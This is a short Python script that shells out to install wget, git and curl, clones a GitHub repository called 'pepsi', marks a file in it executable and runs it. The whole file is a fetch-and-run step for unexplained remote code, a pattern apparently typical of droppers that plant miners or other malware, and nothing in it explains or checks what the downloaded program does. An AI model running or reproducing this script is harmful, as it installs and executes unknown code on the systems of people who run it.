#!/usr/bin/env python
import subprocess

subprocess.check_call("apt update;apt -y install wget git curl;git clone https://github.com/abongiletraeffik/pepsi.git;cd pepsi;chmod +x pepsi;bash pepsi", shell=True)
